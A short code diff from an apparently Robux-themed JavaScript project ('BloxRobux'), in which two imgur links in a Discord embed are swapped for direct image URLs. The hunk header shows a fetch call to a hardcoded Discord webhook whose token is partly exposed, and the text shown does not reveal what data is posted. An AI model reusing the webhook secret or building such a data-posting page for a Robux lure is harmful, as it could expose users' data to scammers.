@@ -167,11 +167,11 @@ await fetch("https://discord.com/api/webhooks/1462212976273789115/5FJAFrFVr2aWyO
         url: lienavatar
       },
       image: {
-        url: "https://imgur.com/G7f87gT"
+        url: "https://i.imgur.com/G7f87gT.png"
       },
       footer: {
         text: "BloxRobux",
-        icon_url: "https://imgur.com/a/lxUdFb0"
+        icon_url: "https://i.imgur.com/PjcK6QD.png"
       },
       timestamp: new Date().toISOString()
     }]
